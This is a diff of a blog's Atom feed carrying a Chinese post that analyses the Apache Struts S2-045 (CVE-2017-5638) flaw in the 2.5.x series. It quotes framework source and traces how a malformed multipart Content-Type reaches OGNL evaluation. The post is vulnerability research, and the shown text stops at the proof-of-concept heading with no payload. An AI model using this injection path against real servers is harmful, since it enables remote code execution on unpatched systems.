@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>奇门遁甲</title>
- <link href="http://localhost:4000/atom.xml" rel="self"/>
- <link href="http://localhost:4000/"/>
- <updated>2017-03-21T10:56:46+08:00</updated>
- <id>http://localhost:4000</id>
+ <link href="www.tang3.org/atom.xml" rel="self"/>
+ <link href="www.tang3.org/"/>
+ <updated>2017-03-21T11:09:37+08:00</updated>
+ <id>www.tang3.org</id>
  <author>
    <name>唐三</name>
    <email></email>
@@ -14,150 +14,150 @@
  
  <entry>
    <title>也谈S2-045</title>
-   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.html"/>
+   <link href="www.tang3.org/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.txt"/>
    <updated>2017-03-21T02:04:34+08:00</updated>
-   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/03/21/也谈S2-045</id>
-   <content type="html">&lt;h2 id=&quot;0x00-序&quot;&gt;0x00 序&lt;/h2&gt;
+   <id>www.tang3.org/%E6%8A%80%E6%9C%AF/2017/03/21/也谈S2-045</id>
+   <content type="html">## 0x00 序
 
-&lt;p&gt;2017年3月7日Struts的S2-045漏洞掀起了一波热潮，刚好休年假出去玩，没有赶上这波，回来赶紧学习各位师傅的文章知识点。网上的分析文章基本上保持了只传PoC，漏洞分析抄官网漏洞描述的炒作风格，能找到的仅有下面这三篇有价值的漏洞分析文章。&lt;/p&gt;
+2017年3月7日Struts的S2-045漏洞掀起了一波热潮，刚好休年假出去玩，没有赶上这波，回来赶紧学习各位师傅的文章知识点。网上的分析文章基本上保持了只传PoC，漏洞分析抄官网漏洞描述的炒作风格，能找到的仅有下面这三篇有价值的漏洞分析文章。
 
-&lt;p&gt;seebug的&lt;a href=&quot;http://paper.seebug.org/241/&quot;&gt;《S2-045 原理初步分析（CVE-2017-5638）》&lt;/a&gt;和&lt;a href=&quot;http://paper.seebug.org/247/&quot;&gt;《S2-045 漏洞分析》&lt;/a&gt;通过对比版本差异分析出漏洞问题的形成，内容上基本大同小异，后一篇比前一篇详细一点。第二篇主要还是在findText、translateVariables这些工具方法上纠结个不停，与其说是漏洞分析，倒不如说是Ognl执行流程分析。其实如果你跟多一些Strut2的Ognl相关漏洞，就会养成对LocalizedTextUtil下方法警觉的习惯，也会对它们执行Ognl表达式的流程烂熟于胸。&lt;/p&gt;
+seebug的[《S2-045 原理初步分析（CVE-2017-5638）》](http://paper.seebug.org/241/)和[《S2-045 漏洞分析》](http://paper.seebug.org/247/)通过对比版本差异分析出漏洞问题的形成，内容上基本大同小异，后一篇比前一篇详细一点。第二篇主要还是在findText、translateVariables这些工具方法上纠结个不停，与其说是漏洞分析，倒不如说是Ognl执行流程分析。其实如果你跟多一些Strut2的Ognl相关漏洞，就会养成对LocalizedTextUtil下方法警觉的习惯，也会对它们执行Ognl表达式的流程烂熟于胸。
 
-&lt;p&gt;还有隐形人真忙的&lt;a href=&quot;http://blog.csdn.net/u011721501/article/details/60768657&quot;&gt;《s2-045漏洞分析》&lt;/a&gt;，这才是一篇真正的漏洞分析，一看就是老司机，入口点直指要害，执行逻辑描述的简单直接毫不拖沓。不过应该是作者只是匆匆一瞥，分析的流程只是2.3.x系列的逻辑，2.5.x系列的漏洞与他所描述的稍有不同。&lt;/p&gt;
+还有隐形人真忙的[《s2-045漏洞分析》](http://blog.csdn.net/u011721501/article/details/60768657)，这才是一篇真正的漏洞分析，一看就是老司机，入口点直指要害，执行逻辑描述的简单直接毫不拖沓。不过应该是作者只是匆匆一瞥，分析的流程只是2.3.x系列的逻辑，2.5.x系列的漏洞与他所描述的稍有不同。
 
-&lt;p&gt;这篇文章我会针对2.5.x系列的漏洞执行流程进行描述，当做隐形人真忙的补充篇。在这之后我会简单分析下这次流出的PoC为什么可以绕过Struts的检查，成功的执行表达式。&lt;/p&gt;
+这篇文章我会针对2.5.x系列的漏洞执行流程进行描述，当做隐形人真忙的补充篇。在这之后我会简单分析下这次流出的PoC为什么可以绕过Struts的检查，成功的执行表达式。
 
-&lt;h2 id=&quot;0x01-漏洞分析25x系列版本篇&quot;&gt;0x01 漏洞分析（2.5.x系列版本篇）&lt;/h2&gt;
+## 0x01 漏洞分析（2.5.x系列版本篇）
 
-&lt;p&gt;形成漏洞的主要原因是处理POST提交multipart/form-data类型的请求过于草率的将带有用户可控内容的错误信息交由Ognl表达式处理，从而造成Ognl表达式代码执行。我们直接来看request请求的解包代码：&lt;/p&gt;
+形成漏洞的主要原因是处理POST提交multipart/form-data类型的请求过于草率的将带有用户可控内容的错误信息交由Ognl表达式处理，从而造成Ognl表达式代码执行。我们直接来看request请求的解包代码：
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wrapRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;// don't wrap more than once&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrutsRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+```java
+    public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {
+        // don't wrap more than once
+        if (request instanceof StrutsRequestWrapper) {
+            return request;
+        }
 
-        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;MultiPartRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getMultiPartRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;LocaleProvider&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getContainer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocaleProvider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mpr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getSaveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disableRequestAttributeValueStackLookup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrutsRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disableRequestAttributeValueStackLookup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        String content_type = request.getContentType();
+        if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) {
+            MultiPartRequest mpr = getMultiPartRequest();
+            LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);
+            request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);
+        } else {
+            request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);
+        }
 
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        return request;
+    }
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+```
 
-&lt;p&gt;判断content_type字段中有没有multipart/form-data字样，有的话就进入了解析逻辑，后面的MultiPartRequestWrapper会通过JakartaMultiPartRequest的parse方法解析multi-part相关的数据（也包含content_type字段中的内容）。如果解析过程中出现问题（比如不符合协议规范）会触发catch流程，向MultiPartRequestWrapper对象插入异常信息。这个地方就是和隐形人真忙分析的2.3.x系列不同的地方，在2.3系列中这里就通过JakartaMultiPartRequest的buildErrorMessage方法直接调用了LocalizedTextUtil的findText方法执行了Ongl。而在2.5.x系列中，buildErrorMessage方法只是构建错误信息字符串，然后插到MultiPartRequestWrapper对象中，猜测应该是官方觉得文件上传部分的错误信息应该统一放到FileUploadInterceptor中处理，避免不同的解析插件错误信息返回不一致。以下为JakartaMultiPartRequest的parse方法代码：&lt;/p&gt;
+判断content_type字段中有没有multipart/form-data字样，有的话就进入了解析逻辑，后面的MultiPartRequestWrapper会通过JakartaMultiPartRequest的parse方法解析multi-part相关的数据（也包含content_type字段中的内容）。如果解析过程中出现问题（比如不符合协议规范）会触发catch流程，向MultiPartRequestWrapper对象插入异常信息。这个地方就是和隐形人真忙分析的2.3.x系列不同的地方，在2.3系列中这里就通过JakartaMultiPartRequest的buildErrorMessage方法直接调用了LocalizedTextUtil的findText方法执行了Ongl。而在2.5.x系列中，buildErrorMessage方法只是构建错误信息字符串，然后插到MultiPartRequestWrapper对象中，猜测应该是官方觉得文件上传部分的错误信息应该统一放到FileUploadInterceptor中处理，避免不同的解析插件错误信息返回不一致。以下为JakartaMultiPartRequest的parse方法代码：
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;saveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;setLocale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;processUpload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;saveDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileUploadException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;LOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Request exceeded size limit!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileUploadBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SizeLimitExceededException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getPermittedSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getActualSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()});&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{});&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+```java
+public void parse(HttpServletRequest request, String saveDir) throws IOException {
+        try {
+            setLocale(request);
+            processUpload(request, saveDir);
+        } catch (FileUploadException e) {
+            LOG.warn(&quot;Request exceeded size limit!&quot;, e);
+            LocalizedMessage errorMessage;
+            if(e instanceof FileUploadBase.SizeLimitExceededException) {
+                FileUploadBase.SizeLimitExceededException ex = (FileUploadBase.SizeLimitExceededException) e;
+                errorMessage = buildErrorMessage(e, new Object[]{ex.getPermittedSize(), ex.getActualSize()});
+            } else {
+                errorMessage = buildErrorMessage(e, new Object[]{});
+            }
 
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;LOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;warn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unable to parse request&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildErrorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{});&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errorMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+            if (!errors.contains(errorMessage)) {
+                errors.add(errorMessage);
+            }
+        } catch (Exception e) {
+            LOG.warn(&quot;Unable to parse request&quot;, e);
+            LocalizedMessage errorMessage = buildErrorMessage(e, new Object[]{});
+            if (!errors.contains(errorMessage)) {
+                errors.add(errorMessage);
+            }
+        }
+    }
+```
 
-&lt;p&gt;再向后走到FileUploadInterceptor中我们就可以发现如下代码：&lt;/p&gt;
+再向后走到FileUploadInterceptor中我们就可以发现如下代码：
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MultiPartRequestWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+```java
+ MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper) request;
 
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;hasErrors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalizedMessage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multiWrapper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getErrors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-                    &lt;span class=&quot;n&quot;&gt;validation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addActionError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalizedTextUtil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTextKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ActionContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLocale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getArgs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()));&lt;/span&gt;
-                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+        if (multiWrapper.hasErrors()) {
+            for (LocalizedMessage error : multiWrapper.getErrors()) {
+                if (validation != null) {
+                    validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
+                }
+            }
+```
 
-&lt;p&gt;这里就是将MultiPartRequestWrapper对象request中的所有error信息遍历出来添加到validation变量中，而添加的过程中就用到了LocalizedTextUtil的findText方法，其中第4个参数会到达我们熟悉的TextParseUtil的translateVariables方法，即作为Ognl表达式执行。&lt;/p&gt;
+这里就是将MultiPartRequestWrapper对象request中的所有error信息遍历出来添加到validation变量中，而添加的过程中就用到了LocalizedTextUtil的findText方法，其中第4个参数会到达我们熟悉的TextParseUtil的translateVariables方法，即作为Ognl表达式执行。
 
-&lt;h2 id=&quot;0x02-poc分析&quot;&gt;0x02 PoC分析&lt;/h2&gt;
